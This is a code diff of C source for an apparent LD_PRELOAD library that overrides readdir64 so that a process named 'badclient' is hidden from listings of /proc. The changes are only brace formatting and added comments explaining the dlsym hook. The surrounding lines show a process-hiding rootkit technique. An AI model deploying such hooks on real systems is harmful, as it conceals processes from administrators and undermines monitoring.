@@ -11,14 +11,16 @@ static const char* process_to_filter = "badclient";
 static int get_dir_name(DIR* dirp, char* buf, size_t size)
 {
     int fd = dirfd(dirp);
-    if(fd == -1) {
+    if(fd == -1) 
+    {
         return 0;
     }
 
     char tmp[64];
     snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
     ssize_t ret = readlink(tmp, buf, size);
-    if(ret == -1) {
+    if(ret == -1) 
+    {
         return 0;
     }
 
@@ -28,7 +30,8 @@ static int get_dir_name(DIR* dirp, char* buf, size_t size)
 
 static int get_process_name(char* pid, char* buf)
 {
-    if(strspn(pid, "0123456789") != strlen(pid)) {
+    if(strspn(pid, "0123456789") != strlen(pid)) 
+    {
         return 0;
     }
 
@@ -36,11 +39,13 @@ static int get_process_name(char* pid, char* buf)
     snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
  
     FILE* f = fopen(tmp, "r");
-    if(f == NULL) {
+    if(f == NULL) 
+    {
         return 0;
     }
 
-    if(fgets(tmp, sizeof(tmp), f) == NULL) {
+    if(fgets(tmp, sizeof(tmp), f) == NULL) 
+    {
         fclose(f);
         return 0;
     }
@@ -58,7 +63,7 @@ struct dirent64 *readdir64(DIR *dirp)
 {
     if (original_readdir64 == NULL) 
     {
-        original_readdir64 = dlsym(RTLD_NEXT, "readdir64");
+        original_readdir64 = dlsym(RTLD_NEXT, "readdir64"); // Asks the dynamic linker to give the next "readdir64" function after this one
         if (original_readdir64 == NULL) 
         {
             fprintf(stderr, "Error in dlsym: %s\n", dlerror());
@@ -70,7 +75,7 @@ struct dirent64 *readdir64(DIR *dirp)
 
     while (1) 
     {
-        dir = original_readdir64(dirp);
+        dir = original_readdir64(dirp); // Advances the directory stream and returns the next struct dirent64 *
 
         if (dir) 
         {
